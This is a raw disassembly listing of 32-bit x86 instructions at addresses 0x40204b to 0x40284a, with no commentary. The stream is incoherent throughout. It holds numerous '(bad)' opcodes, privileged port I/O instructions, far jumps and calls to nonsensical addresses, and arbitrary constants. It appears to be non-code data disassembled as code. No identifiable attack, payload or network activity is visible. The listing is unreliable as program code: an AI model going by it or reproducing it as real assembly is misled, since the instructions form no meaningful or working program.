  40204b:	outs   dx,BYTE PTR ds:[esi]
  40204c:	sub    ebx,eax
  40204e:	cwde   
  40204f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402050:	js     0x40209f
  402052:	in     eax,0x11
  402054:	aad    0x71
  402056:	mov    esp,0xb4070c07
  40205b:	inc    ebx
  40205c:	xor    ebp,edi
  40205e:	in     al,dx
  40205f:	out    dx,al
  402060:	ror    DWORD PTR [ebx+ecx*8+0x171c847b],cl
  402067:	scas   eax,DWORD PTR es:[edi]
  402068:	cwde   
  402069:	push   edi
  40206a:	lock mov ds:0x61a2574f,eax
  402070:	mov    bh,0xc8
  402072:	adc    DWORD PTR [ebp+0x58fff447],ecx
  402078:	mov    ebx,0xfce60691
  40207d:	mov    bh,0x1d
  40207f:	ret    
  402080:	pop    edx
  402081:	jbe    0x4020ab
  402083:	dec    esi
  402084:	push   ebp
  402085:	pusha  
  402086:	aaa    
  402087:	cmp    al,0x3
  402089:	cmp    edi,esi
  40208b:	es cmp al,0xd2
  40208e:	jo     0x4020f0
  402090:	pop    ebp
  402091:	fwait
  402092:	add    dh,BYTE PTR [edi+0x11]
  402095:	push   edx
  402096:	(bad)  
  402097:	mov    esp,0x46b60434
  40209c:	aas    
  40209d:	add    ebp,DWORD PTR [edi+0x5d3ef0b6]
  4020a3:	dec    eax
  4020a4:	mov    ds:0xebf32c09,al
  4020a9:	xchg   edi,eax
  4020aa:	cmovnp ecx,DWORD PTR [eax+0x2f42b7d1]
  4020b1:	rcr    BYTE PTR [ecx-0x54],0x2b
  4020b5:	fcom   QWORD PTR [ebx]
  4020b7:	rcl    ch,1
  4020b9:	xor    edi,DWORD PTR [edx]
  4020bb:	iret   
  4020bc:	dec    edx
  4020bd:	push   edx
  4020be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020bf:	add    BYTE PTR [esi+edi*2+0x2c6e9c89],bh
  4020c6:	mov    ecx,DWORD PTR [edx-0x1a]
  4020c9:	outs   dx,DWORD PTR ds:[esi]
  4020ca:	or     eax,0xf2d982f2
  4020cf:	or     eax,0xca5c6cf5
  4020d4:	(bad)  
  4020d5:	out    0x6f,al
  4020d7:	sbb    eax,0xed26bb71
  4020dc:	dec    ebp
  4020dd:	jmp    0x2bc4:0xe323240f
  4020e4:	in     eax,0xff
  4020e6:	rcr    BYTE PTR [ecx-0x33e1e9b4],0x51
  4020ed:	jp     0x40207c
  4020ef:	lods   eax,DWORD PTR ds:[esi]
  4020f0:	fstp   QWORD PTR [eax]
  4020f2:	out    dx,eax
  4020f3:	popf   
  4020f4:	push   esi
  4020f5:	push   es
  4020f6:	xchg   esp,eax
  4020f7:	pop    es
  4020f8:	xor    esp,0x1f
  4020fb:	mov    al,0xc8
  4020fd:	inc    ecx
  4020fe:	or     DWORD PTR [eax-0x52],0x2fd44ca3
  402105:	sbb    dh,ah
  402107:	mov    eax,0x57d4d1f6
  40210c:	add    DWORD PTR [eax+eiz*4],esi
  40210f:	leave  
  402110:	sub    ebp,esi
  402112:	xor    esp,DWORD PTR [edx-0x58d861c2]
  402118:	pop    ds
  402119:	scas   eax,DWORD PTR es:[edi]
  40211a:	xor    ah,BYTE PTR [ebp+0xe3a9476]
  402120:	in     eax,0xac
  402122:	and    BYTE PTR [esi-0x28cdce8f],dh
  402128:	xor    DWORD PTR [esi+0x78],ebx
  40212b:	mov    eax,ds:0x5be9a4dc
  402130:	ins    BYTE PTR es:[edi],dx
  402131:	jp     0x402124
  402133:	retf   0xa8fa
  402136:	push   cs
  402137:	xchg   ebp,eax
  402138:	out    0xf2,eax
  40213a:	xchg   ebx,eax
  40213b:	mov    ecx,0x7847be17
  402140:	push   ds
  402141:	leave  
  402142:	pop    esi
  402143:	jo     0x4021be
  402145:	hlt    
  402146:	mov    al,gs:0x379e2001
  40214c:	aad    0xd3
  40214e:	push   0x1f1eb991
  402153:	loopne 0x40216a
  402155:	dec    ecx
  402156:	xor    WORD PTR [eax-0x51],0xf66c
  40215c:	push   0xa1a3e1e8
  402161:	and    eax,0xa681f058
  402166:	fdiv   QWORD PTR [ebx+ebx*1]
  402169:	jae    0x4021d3
  40216b:	xchg   ebx,eax
  40216c:	ret    
  40216d:	pop    edx
  40216e:	inc    edi
  40216f:	test   DWORD PTR [ebx+0x17],edi
  402172:	or     DWORD PTR [ecx+eiz*8-0x15144c82],esi
  402179:	lods   al,BYTE PTR ds:[esi]
  40217a:	shr    ebx,1
  40217c:	pop    esp
  40217d:	mov    ch,0x16
  40217f:	and    cl,BYTE PTR [ebx-0x1d]
  402182:	inc    eax
  402183:	xchg   edi,eax
  402184:	ins    BYTE PTR es:[edi],dx
  402185:	jmp    0x52db:0x6c9376af
  40218c:	popa   
  40218d:	mov    ebx,0x85a86f37
  402192:	ret    
  402193:	imul   esi,DWORD PTR [ebx-0x6c],0xaf87ccf7
  40219a:	cmp    al,0xd
  40219c:	mov    ds,WORD PTR [edx+ebp*1-0x49ab8290]
  4021a3:	pushf  
  4021a4:	popa   
  4021a5:	or     DWORD PTR [ebx],edi
  4021a7:	mov    al,0xc0
  4021a9:	cmp    al,0x2b
  4021ab:	stos   DWORD PTR es:[edi],eax
  4021ac:	adc    edx,DWORD PTR ds:0xce7e5172
  4021b2:	das    
  4021b3:	imul   ebp,DWORD PTR [ebx+0x51],0x3798eee6
  4021ba:	and    DWORD PTR [edi+0x7c6ee9ba],ebp
  4021c0:	sbb    DWORD PTR [ebp-0x75],0x7e
  4021c4:	out    0x70,al
  4021c6:	pop    esp
  4021c7:	cmp    bl,BYTE PTR [ebx-0x27]
  4021ca:	outs   dx,DWORD PTR ds:[esi]
  4021cb:	retf   0x3211
  4021ce:	jnp    0x402202
  4021d0:	or     edi,eax
  4021d2:	mov    cl,0x89
  4021d4:	cmp    BYTE PTR [edx+0x47c66004],cl
  4021da:	outs   dx,BYTE PTR ds:[esi]
  4021db:	and    eax,edx
  4021dd:	pushw  0x3902
  4021e1:	mov    dl,0xd5
  4021e3:	xchg   ecx,eax
  4021e4:	nop
  4021e5:	add    DWORD PTR [ebp+0x7e],esp
  4021e8:	or     BYTE PTR [eax+0x66],ah
  4021eb:	das    
  4021ec:	(bad)  
  4021ed:	fidiv  WORD PTR [edi]
  4021ef:	mov    dl,0x1
  4021f1:	xchg   dl,cl
  4021f3:	arpl   WORD PTR [edx-0x3a6a5a8f],sp
  4021f9:	imul   edi,DWORD PTR [esi+0x10],0xc9d0ddcb
  402200:	popf   
  402201:	xor    ah,BYTE PTR [edx+0x76]
  402204:	adc    edi,ebp
  402206:	sbb    bh,BYTE PTR [edx-0x304f94ec]
  40220c:	imul   ecx,DWORD PTR [esi-0x1a8ee25e],0xffffffc6
  402213:	mov    esi,0xafb36e58
  402218:	push   0xa805350a
  40221d:	sub    bh,BYTE PTR [edx+edx*4-0x9]
  402221:	xor    DWORD PTR [esi+0x46],edx
  402224:	sub    ecx,eax
  402226:	dec    edx
  402227:	mov    BYTE PTR [ebx],bl
  402229:	or     BYTE PTR [esi-0x9],ah
  40222c:	pop    bp
  40222e:	push   0x788f253a
  402233:	out    0x36,al
  402235:	data16 addr16 sub al,0xf2
  402239:	xchg   edi,eax
  40223a:	shl    BYTE PTR [ebx+0xc646fc],1
  402240:	fidivr WORD PTR [ecx-0x7b]
  402243:	imul   ebp,esi,0x4018e1b7
  402249:	clc    
  40224a:	mov    al,0xa8
  40224c:	mov    DWORD PTR [esi],ebp
  40224e:	mov    eax,0x4dc06484
  402253:	mov    dh,0x7f
  402255:	arpl   WORD PTR ds:0xed1e0ad9,dx
  40225b:	clc    
  40225c:	lahf   
  40225d:	fadd   QWORD PTR [ebp+esi*1+0x509df00d]
  402264:	push   0x53
  402266:	scas   eax,DWORD PTR es:[edi]
  402267:	cwde   
  402268:	aam    0x3b
  40226a:	ds jmp 0x4022a1
  40226d:	ins    DWORD PTR es:[di],dx
  40226f:	imul   edi,eax,0xfffffff0
  402272:	adc    ebp,DWORD PTR [ebp+0x669045f4]
  402278:	cmc    
  402279:	ins    DWORD PTR es:[edi],dx
  40227a:	rcl    BYTE PTR [eax-0x3b],1
  40227d:	mov    DWORD PTR [ebx+0x14],ebx
  402280:	mov    esp,0x7485a1c5
  402285:	gs cdq 
  402287:	mov    bl,0xc7
  402289:	adc    BYTE PTR [edx+ecx*1],ch
  40228c:	retf   
  40228d:	dec    edi
  40228e:	(bad)  
  40228f:	dec    BYTE PTR [ebp+0x4c]
  402292:	enterw 0xd8e5,0xe2
  402297:	xor    BYTE PTR [ecx-0x467b332e],al
  40229d:	mov    ecx,0x8c1d9016
  4022a2:	mov    esp,DWORD PTR [ebx-0x7c]
  4022a5:	cmp    ch,bh
  4022a7:	mov    edx,0x2f578455
  4022ac:	adc    ecx,DWORD PTR [esi+0x49]
  4022af:	(bad)
  4022b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022b3:	fistp  QWORD PTR [ecx]
  4022b5:	retf   
  4022b6:	sbb    BYTE PTR [ebx-0x6318bf56],ch
  4022bc:	xor    DWORD PTR [esi],ebp
  4022be:	jge    0x4022e1
  4022c0:	cmp    al,0x1b
  4022c2:	jns    0x402248
  4022c4:	lods   al,BYTE PTR ds:[esi]
  4022c5:	push   esi
  4022c6:	mov    ds:0x92b0e873,al
  4022cb:	jge    0x402322
  4022cd:	and    BYTE PTR [eax-0x45ae21c0],ah
  4022d3:	cli    
  4022d4:	lea    ebx,[edx+0x6dfbbadf]
  4022da:	in     al,dx
  4022db:	adc    eax,0x4e668543
  4022e0:	shr    BYTE PTR [edx+eax*8-0x72ea6b6d],0x32
  4022e8:	lock sub BYTE PTR [ecx],dh
  4022eb:	sub    al,0xb1
  4022ed:	and    ch,0xc8
  4022f0:	leave  
  4022f1:	and    eax,0xc612ea0c
  4022f6:	push   edi
  4022f7:	push   eax
  4022f8:	pop    ecx
  4022f9:	xchg   esp,eax
  4022fa:	loope  0x4022f1
  4022fc:	pop    edi
  4022fd:	leave  
  4022fe:	lds    ebp,FWORD PTR [edi+0x156ecd85]
  402304:	mov    ebp,0xdb1ae91f
  402309:	add    BYTE PTR [eax+esi*2+0x2c],cl
  40230d:	lahf   
  40230e:	shl    BYTE PTR [ebx+0x21],0x97
  402312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402313:	cmc    
  402314:	sub    eax,0x19881525
  402319:	mov    ds:0xf67edde7,al
  40231e:	(bad)  
  40231f:	xchg   edi,eax
  402320:	push   es
  402321:	or     BYTE PTR [esi-0x75340f38],0xa3
  402328:	ret    0x78cb
  40232b:	mov    WORD PTR [edx],fs
  40232d:	mov    dl,0x91
  40232f:	mov    cl,0x7b
  402331:	rcl    DWORD PTR [ecx-0x1603be26],1
  402337:	cmp    DWORD PTR [esi+0x3952810f],edx
  40233d:	mov    al,ds:0x3733ad9a
  402342:	pop    ecx
  402343:	xchg   edx,eax
  402344:	jne    0x402335
  402346:	xor    BYTE PTR [edx+0x75dfb1fe],bl
  40234c:	or     eax,0x35129006
  402351:	and    ebp,DWORD PTR [esi-0x70]
  402354:	pop    ebp
  402355:	sbb    edi,eax
  402357:	std    
  402358:	sbb    dh,BYTE PTR ds:0x9d7a8a3d
  40235e:	adc    ch,ah
  402360:	jmp    0x402385
  402362:	add    ah,0xd
  402365:	lods   al,BYTE PTR ds:[esi]
  402366:	pop    eax
  402367:	pop    edx
  402368:	dec    eax
  402369:	and    DWORD PTR [ecx+0x1de87e25],esi
  40236f:	add    esi,edi
  402371:	adc    DWORD PTR [eax-0x34d4828d],0xeaec3521
  40237b:	jnp    0x402320
  40237d:	retf   
  40237e:	outs   dx,BYTE PTR ds:[esi]
  40237f:	add    dl,bh
  402381:	cli    
  402382:	mov    ebp,0x81102a8a
  402387:	clc    
  402388:	add    dl,ah
  40238a:	test   DWORD PTR [ebp-0x2a],esp
  40238d:	sub    DWORD PTR [ebx],eax
  40238f:	push   edx
  402390:	fst    QWORD PTR [edi+0xcc5b2c1]
  402396:	shr    BYTE PTR [eax+0x19ff2ad],0x8c
  40239d:	stc    
  40239e:	push   cs
  40239f:	push   ecx
  4023a0:	daa    
  4023a1:	add    dh,BYTE PTR [eax]
  4023a3:	fmul   QWORD PTR [eax]
  4023a5:	push   ecx
  4023a6:	scas   al,BYTE PTR es:[edi]
  4023a7:	(bad)  
  4023a8:	test   dh,0x6d
  4023ab:	jmp    0x5c63:0x206392d1
  4023b2:	int    0x1
  4023b4:	pop    eax
  4023b5:	cld    
  4023b6:	and    DWORD PTR [edi],ebx
  4023b8:	sbb    BYTE PTR [ebx+0x32],bh
  4023bb:	jmp    0x7644:0x7395b2
  4023c2:	stc    
  4023c3:	xchg   edx,eax
  4023c4:	pop    esp
  4023c5:	(bad)  [ecx+ecx*2+0x49045ee6]
  4023cc:	dec    esi
  4023cd:	cld    
  4023ce:	retf   0x91b1
  4023d1:	(bad)  
  4023d2:	into   
  4023d3:	push   ebx
  4023d4:	push   eax
  4023d5:	or     al,0x36
  4023d7:	ins    BYTE PTR es:[edi],dx
  4023d8:	pop    edi
  4023d9:	retf   
  4023da:	mov    edi,0xba883998
  4023df:	jle    0x4023a1
  4023e1:	(bad)
  4023e4:	mov    dl,0x76
  4023e6:	dec    ebp
  4023e7:	and    DWORD PTR [edx-0x549ad799],ebp
  4023ed:	loopne 0x4023b2
  4023ef:	fcom   QWORD PTR [edx+0x21bcf14]
  4023f5:	xor    ch,bl
  4023f7:	and    eax,0x6c23f90a
  4023fc:	xchg   esp,eax
  4023fd:	add    al,0xca
  4023ff:	pop    ebx
  402400:	pushf  
  402401:	push   ss
  402402:	enter  0x70,0xf5
  402406:	fimul  DWORD PTR [edx+0x66d1913]
  40240c:	retf   
  40240d:	sbb    eax,0xc996643
  402412:	cmp    BYTE PTR [ebp+ebx*2+0x21],al
  402416:	and    DWORD PTR [ebp-0x3e],edx
  402419:	mov    bl,0xa0
  40241b:	mov    esi,0xa99937cc
  402420:	fcomp  DWORD PTR [ebx]
  402422:	popa   
  402423:	arpl   sp,si
  402425:	mov    ebx,0x6ab93cbd
  40242a:	imul   edx,DWORD PTR [eax-0x60],0xf82ef329
  402431:	retf   0xb760
  402434:	push   ss
  402435:	xlat   BYTE PTR ds:[ebx]
  402436:	ja     0x4023f6
  402438:	push   eax
  402439:	scas   al,BYTE PTR es:[edi]
  40243a:	push   cs
  40243b:	shr    BYTE PTR [edi],1
  40243d:	pop    edx
  40243e:	popf   
  40243f:	push   esp
  402440:	(bad)  
  402441:	in     al,dx
  402442:	out    0xa0,al
  402444:	out    dx,eax
  402445:	jae    0x4023c7
  402447:	and    eax,0x6dc2a4be
  40244c:	pop    ecx
  40244d:	jmp    0x6aff5a03
  402452:	mov    al,ds:0xb0464a55
  402457:	das    
  402458:	xor    bh,BYTE PTR [ecx+ecx*4]
  40245b:	lds    edi,FWORD PTR [edx+0x35]
  40245e:	je     0x40244e
  402460:	pop    edi
  402461:	lahf   
  402462:	xchg   edx,eax
  402463:	push   eax
  402464:	pop    ss
  402465:	jns    0x40248b
  402467:	xor    bh,al
  402469:	or     eax,0x762b8446
  40246e:	or     esp,esi
  402470:	xor    esi,DWORD PTR [eax-0x3c]
  402473:	jbe    0x40247d
  402475:	adc    esp,0x32a21656
  40247b:	inc    edx
  40247c:	data16 fadd st,st(3)
  40247f:	shr    BYTE PTR [esi+0x43],cl
  402482:	mov    eax,0x8cdc28a5
  402487:	mov    ds:0x7108817d,al
  40248c:	(bad)  
  40248d:	adc    eax,0x3c43796
  402492:	or     ecx,0xe9a2bb90
  402498:	out    dx,al
  402499:	bswap  eax
  40249b:	mov    ebp,0xdd9a1e87
  4024a0:	inc    esp
  4024a1:	inc    edi
  4024a2:	aad    0x28
  4024a4:	mov    ds:0x3ad90edd,al
  4024a9:	stos   DWORD PTR es:[edi],eax
  4024aa:	(bad)  
  4024ab:	data16 mov bh,0x23
  4024ae:	lahf   
  4024af:	bnd je 0x402516
  4024b2:	xor    al,0x4e
  4024b4:	ja     0x402506
  4024b6:	(bad)  
  4024b7:	ficom  WORD PTR [edx-0x3b]
  4024ba:	lds    edx,FWORD PTR [ebx+0x71]
  4024bd:	loopne 0x402529
  4024bf:	xor    al,0x52
  4024c1:	jns    0x402526
  4024c3:	mov    ds:0x75c69b56,al
  4024c8:	jmp    0xd4de1ddb
  4024cd:	mov    cl,0x7e
  4024cf:	pop    eax
  4024d0:	scas   eax,DWORD PTR es:[edi]
  4024d1:	push   ecx
  4024d2:	adc    al,0xc7
  4024d4:	or     al,0xc
  4024d6:	test   BYTE PTR [ebx-0x22],dh
  4024d9:	dec    edi
  4024da:	push   esi
  4024db:	dec    esp
  4024dc:	pop    esi
  4024dd:	inc    esi
  4024de:	bound  eax,QWORD PTR ss:[edi]
  4024e1:	or     dl,BYTE PTR [esi-0x5875326e]
  4024e7:	mov    ?,WORD PTR [ecx]
  4024e9:	and    ah,BYTE PTR [ecx-0xb96f9b2]
  4024ef:	inc    eax
  4024f0:	mov    WORD PTR [esi],fs
  4024f2:	pop    eax
  4024f3:	ins    BYTE PTR es:[edi],dx
  4024f4:	popa   
  4024f5:	lods   eax,DWORD PTR ds:[esi]
  4024f6:	ss pop es
  4024f8:	push   eax
  4024f9:	and    BYTE PTR [eax+0x3b],dl
  4024fc:	xchg   ebx,eax
  4024fd:	mov    ah,0xcd
  4024ff:	cmp    ebx,DWORD PTR [ecx]
  402501:	pusha  
  402502:	jge    0x402559
  402504:	jns    0x4024de
  402506:	daa    
  402507:	mov    esi,DWORD PTR [ebx]
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	jb     0x4024ec
  40250c:	mov    ebx,0x29afb6b3
  402511:	cmp    cl,ch
  402513:	(bad)  
  402514:	sbb    esp,DWORD PTR [edx+0x40948cda]
  40251a:	adc    esp,DWORD PTR [esi-0x2b]
  40251d:	sti    
  40251e:	mov    ah,BYTE PTR [esi+eiz*8-0x12903eca]
  402525:	test   al,0xe6
  402527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402528:	into   
  402529:	ret    
  40252a:	ins    BYTE PTR es:[edi],dx
  40252b:	fidiv  WORD PTR [esi]
  40252d:	out    0xb5,al
  40252f:	test   BYTE PTR [esp],ch
  402532:	loope  0x402599
  402534:	adc    al,0x36
  402536:	call   0x7cc30252
  40253b:	or     DWORD PTR es:0x2e67c761,ecx
  402542:	xchg   esp,eax
  402543:	jmp    0xb7f6:0xbbdbe328
  40254a:	dec    esp
  40254b:	lahf   
  40254c:	cmc    
  40254d:	pop    ebp
  40254e:	mov    ds:0x2d1ff545,eax
  402553:	cmp    ebp,DWORD PTR [ebx+ebx*1+0x5f]
  402557:	fsubr  QWORD PTR [edx+0x1e]
  40255a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40255b:	or     eax,0xe369715d
  402560:	loop   0x4025c4
  402562:	xor    BYTE PTR [ecx-0x4d5b0f15],dl
  402568:	add    DWORD PTR [esp+edx*2+0x55],esp
  40256c:	push   0x1f
  40256e:	xor    BYTE PTR [edi+0x75],bh
  402571:	pop    esi
  402572:	fwait
  402573:	inc    edi
  402574:	mov    esi,0x921e2b20
  402579:	ins    BYTE PTR es:[edi],dx
  40257a:	jge    0x4025ca
  40257c:	mov    ecx,0xe95817af
  402581:	xor    cl,bh
  402583:	pop    edx
  402584:	sub    al,BYTE PTR [edx+0x569a56f6]
  40258a:	sbb    DWORD PTR [esi+ebp*2-0x70],0x261ae6c9
  402592:	(bad)  
  402593:	ror    eax,1
  402595:	sti    
  402596:	test   eax,0x56bd0ea9
  40259b:	scas   eax,DWORD PTR es:[edi]
  40259c:	xor    eax,0x3549de75
  4025a1:	into   
  4025a2:	pop    edi
  4025a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a4:	ja     0x402560
  4025a6:	popf   
  4025a7:	jbe    0x402593
  4025a9:	sahf   
  4025aa:	and    BYTE PTR [eax-0x60],0x6c
  4025ae:	push   ds
  4025af:	ja     0x402623
  4025b1:	cwde   
  4025b2:	stc    
  4025b3:	adc    ah,BYTE PTR [esi-0x3a]
  4025b6:	fwait
  4025b7:	xlat   BYTE PTR ds:[ebx]
  4025b8:	sub    cl,0xad
  4025bb:	mov    ah,0x88
  4025bd:	inc    ebx
  4025be:	cmp    al,0xb9
  4025c0:	mov    dh,0x61
  4025c2:	add    edx,DWORD PTR [esp+eiz*2]
  4025c5:	pop    esp
  4025c6:	sbb    BYTE PTR [eax-0xa],ch
  4025c9:	mov    ds:0x5604c638,eax
  4025ce:	(bad)  
  4025cf:	jle    0x402635
  4025d1:	mov    DWORD PTR [edi],ecx
  4025d3:	lds    edi,FWORD PTR [edi+0x908292c]
  4025d9:	imul   esi,DWORD PTR [edx+0x44c6043a],0xffffffa3
  4025e0:	inc    ecx
  4025e1:	inc    esp
  4025e2:	mov    ch,0x7d
  4025e4:	jmp    0x19a:0x451bda69
  4025eb:	gs push ebx
  4025ed:	test   eax,0xd18eaae8
  4025f2:	cmp    ecx,ebx
  4025f4:	jmp    0x40264e
  4025f6:	daa    
  4025f7:	lahf   
  4025f8:	mov    edx,0x6eba537f
  4025fd:	sub    DWORD PTR [eax-0x9],edx
  402600:	fdivr  QWORD PTR [esi+0x9010c6d]
  402606:	adc    dh,BYTE PTR [ebx+0x62]
  402609:	hlt    
  40260a:	xor    bh,BYTE PTR [ebx]
  40260c:	imul   edi
  40260e:	fs push 0x544cfc33
  402614:	lahf   
  402615:	add    eax,0x59add87b
  40261a:	fcmovnbe st,st(0)
  40261c:	xor    cl,ch
  40261e:	ss push cs
  402620:	jbe    0x402623
  402622:	add    DWORD PTR [ecx-0x42],0x476a51e2
  402629:	adc    bl,BYTE PTR [edi]
  40262b:	sbb    dl,bl
  40262d:	bound  ecx,QWORD PTR [ebx+0x43238a36]
  402633:	adc    bh,BYTE PTR [ebp-0x7b41e353]
  402639:	dec    eax
  40263a:	stc    
  40263b:	inc    BYTE PTR [eax+0x30]
  40263e:	shl    BYTE PTR [edi-0x3f045878],1
  402644:	aas    
  402645:	iret   
  402646:	cdq    
  402647:	jno    0x40263e
  402649:	jae    0x4025d3
  40264b:	mov    bh,0x2a
  40264d:	pop    ss
  40264e:	sti    
  40264f:	popa   
  402650:	out    dx,eax
  402651:	jbe    0x40263b
  402653:	jle    0x402606
  402655:	adc    cl,dl
  402657:	xchg   esp,eax
  402658:	jge    0x40268a
  40265a:	fcomp  DWORD PTR [eax-0x3d]
  40265d:	sub    ebx,DWORD PTR [ebp-0x36]
  402660:	in     al,dx
  402661:	inc    eax
  402662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402663:	leave  
  402664:	adc    al,0x7
  402666:	add    eax,0xc087385d
  40266b:	push   ss
  40266c:	pop    es
  40266d:	push   cs
  40266e:	pop    ebp
  40266f:	stos   DWORD PTR es:[edi],eax
  402670:	push   0xffffff94
  402672:	jecxz  0x4026e4
  402674:	dec    ecx
  402675:	push   ds
  402676:	xor    dl,0x28
  402679:	rcr    BYTE PTR [edi+edi*1+0x1abdb3d4],0x67
  402681:	xor    BYTE PTR [ebp+edi*8-0x78],0x51
  402686:	mov    bh,0x6f
  402688:	imul   ebp,ecx,0xa3c97d28
  40268e:	data16 outs dx,BYTE PTR ds:[esi]
  402690:	(bad)  
  402691:	adc    ch,BYTE PTR [ebx+0x73943b2a]
  402697:	and    esp,ebx
  402699:	imul   esi,DWORD PTR [edx-0x4785a155],0xffffff92
  4026a0:	jge    0x40267f
  4026a2:	jbe    0x40268b
  4026a4:	setbe  BYTE PTR [ebp-0x3be299ab]
  4026ab:	scas   al,BYTE PTR es:[edi]
  4026ac:	es adc ebp,edx
  4026af:	inc    ecx
  4026b0:	push   ds
  4026b1:	ins    DWORD PTR es:[edi],dx
  4026b2:	dec    ebx
  4026b3:	xchg   edi,eax
  4026b4:	sub    BYTE PTR [ebx-0x30],dh
  4026b7:	mov    ecx,0x1c2bfae4
  4026bc:	retf   0x791e
  4026bf:	clc    
  4026c0:	cwde   
  4026c1:	inc    ebx
  4026c2:	or     eax,0x9859db69
  4026c7:	pop    ecx
  4026c8:	test   eax,0xfd4e885a
  4026cd:	int    0xce
  4026cf:	inc    esi
  4026d0:	out    dx,eax
  4026d1:	jge    0x4026f1
  4026d3:	sub    dl,cl
  4026d5:	out    dx,al
  4026d6:	adc    edx,0x11cf69c3
  4026dc:	lahf   
  4026dd:	das    
  4026de:	fcom   QWORD PTR [edx-0x5c3a092]
  4026e4:	sahf   
  4026e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e6:	mov    bl,BYTE PTR [edx+0x3b]
  4026e9:	repz fstp TBYTE PTR [edi+0x56]
  4026ed:	add    edx,DWORD PTR [esi-0x5a83205d]
  4026f3:	pop    es
  4026f4:	imul   eax,DWORD PTR [ecx],0x60
  4026f7:	fs inc esi
  4026f9:	sbb    al,0x0
  4026fb:	fistp  DWORD PTR [eax]
  4026fd:	jo     0x4026a3
  4026ff:	mov    edi,0x156c7dfa
  402704:	jmp    0x8834e917
  402709:	lea    ebx,[ebx+ecx*2]
  40270c:	call   0xbf6ceac8
  402711:	xor    eax,0x17df2001
  402716:	inc    edx
  402717:	js     0x4026fc
  402719:	ror    BYTE PTR [esi-0x64],cl
  40271c:	mov    ebx,0xb9cc1e7c
  402721:	jl     0x40275b
  402723:	enter  0xf1cd,0xcb
  402727:	and    eax,0x9e3e03b8
  40272c:	ror    esi,1
  40272e:	pop    ds
  40272f:	sub    esi,DWORD PTR [edx-0x5607bbe3]
  402735:	push   es
  402736:	cmp    edx,DWORD PTR [ebp-0x51]
  402739:	out    0x53,eax
  40273b:	fimul  DWORD PTR [edx-0x74]
  40273e:	popf   
  40273f:	cli    
  402740:	push   0xffffffd7
  402742:	fild   WORD PTR [eax]
  402744:	push   es
  402745:	fdivr  DWORD PTR [edi-0x35c490cf]
  40274b:	cmp    al,0x8d
  40274d:	or     eax,0xb4977ecf
  402752:	jne    0x402796
  402754:	loopne 0x4027cb
  402756:	ins    DWORD PTR es:[edi],dx
  402757:	ins    DWORD PTR es:[edi],dx
  402758:	neg    dl
  40275a:	int3   
  40275b:	jnp    0x4027ad
  40275d:	sub    edx,DWORD PTR [ecx-0x22]
  402760:	mov    dl,0x87
  402762:	push   edi
  402763:	adc    al,0xe8
  402765:	xor    esi,ebp
  402767:	jo     0x402779
  402769:	jge    0x402726
  40276b:	pop    esi
  40276c:	pop    esp
  40276d:	cmp    DWORD PTR [esi],ecx
  40276f:	sub    BYTE PTR [ecx+eiz*2-0x27],0xf7
  402774:	jne    0x402789
  402776:	mul    esp
  402778:	mov    ebx,0xeab62482
  40277d:	cmp    DWORD PTR [esi+0x60db923d],0xffffffa7
  402784:	hlt    
  402785:	adc    DWORD PTR [eax+0x58],ebp
  402788:	call   0x6ecbc0c4
  40278d:	shr    eax,cl
  40278f:	std    
  402790:	push   edi
  402791:	or     dh,BYTE PTR [ebx]
  402793:	fiadd  WORD PTR [esi+0x61c78a8a]
  402799:	ret    0xfed9
  40279c:	mov    ebp,0x2d3c7a76
  4027a1:	sub    ah,BYTE PTR [esi]
  4027a3:	push   cs
  4027a4:	daa    
  4027a5:	js     0x4027e2
  4027a7:	jns    0x40272e
  4027a9:	jge    0x40280a
  4027ab:	sahf   
  4027ac:	(bad)  
  4027ae:	xor    al,0x58
  4027b0:	mov    bl,0xcd
  4027b2:	mov    bh,0xa6
  4027b4:	xor    ebp,ecx
  4027b6:	and    DWORD PTR ds:0x337ba0c8,eax
  4027bc:	arpl   WORD PTR [ecx+0x3b7f69],di
  4027c2:	enter  0x9b3d,0xef
  4027c6:	jb     0x402833
  4027c8:	jle    0x40282c
  4027ca:	and    eax,0x6cc0d57b
  4027cf:	mov    DWORD PTR [esp+ebx*8+0x3068d3d6],ecx
  4027d6:	cmp    dl,BYTE PTR [ebp-0x2ce5724]
  4027dc:	call   0x5c079254
  4027e1:	xlat   BYTE PTR ds:[ebx]
  4027e2:	int3   
  4027e3:	jns    0x402839
  4027e5:	pop    eax
  4027e6:	outs   dx,DWORD PTR ds:[esi]
  4027e7:	push   ebp
  4027e8:	sub    al,0xa7
  4027ea:	jge    0x4027ea
  4027ec:	mov    cl,0x5c
  4027ee:	rcr    DWORD PTR [si],1
  4027f1:	cmp    ecx,DWORD PTR [ecx+edx*4]
  4027f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f5:	fs dec ebx
  4027f7:	rcr    DWORD PTR [ecx+0x4a],0x96
  4027fb:	or     bh,ch
  4027fd:	jmp    0xa80488c6
  402802:	mov    WORD PTR [ecx-0x2f0a2fe0],fs
  402808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402809:	popf   
  40280a:	inc    esp
  40280b:	inc    ecx
  40280c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40280d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40280e:	mov    bh,0x54
  402810:	gs cdq 
  402812:	in     al,0x60
  402814:	mov    eax,ds:0xc238a5b8
  402819:	pushf  
  40281a:	adc    eax,0xca471c9a
  40281f:	and    DWORD PTR [edi+0x1885db09],esi
  402825:	dec    edx
  402826:	clc    
  402827:	in     al,dx
  402828:	sti    
  402829:	shl    ch,cl
  40282b:	push   esi
  40282c:	bsr    edx,DWORD PTR [ebp+0x35757402]
  402833:	loopne 0x4027f6
  402835:	(bad)  
  402836:	stos   DWORD PTR es:[edi],eax
  402837:	in     al,dx
  402838:	sbb    al,0x7b
  40283a:	inc    ebx
  40283b:	jb     0x402846
  40283d:	lock pop ebp
  40283f:	retf   
  402840:	push   ecx
  402841:	js     0x402862
  402843:	mov    ecx,0x18095016
  402848:	jg     0x402831
  40284a:	out    0xcb,eax
